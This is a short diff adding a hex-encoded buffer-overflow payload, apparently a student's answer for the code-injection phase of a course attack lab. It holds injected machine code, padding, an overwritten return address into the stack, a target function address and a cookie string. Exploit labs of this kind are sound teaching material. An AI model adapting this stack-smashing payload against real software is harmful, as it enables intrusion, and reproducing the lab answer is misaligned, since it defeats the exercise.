@@ -1,0 +1,8 @@
+48 c7 c7 d0 01 61 55 c3 /* Code for setting cookie */
+00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+98 01 61 55 00 00 00 00 /* Address of rsp (the address of the injected code) + padding for 8 bytes of address */
+98 18 40 00 00 00 00 00 /* Address of touch3 + padding for 8 bytes of address */
+36 36 36 65 62 31 62 65 00
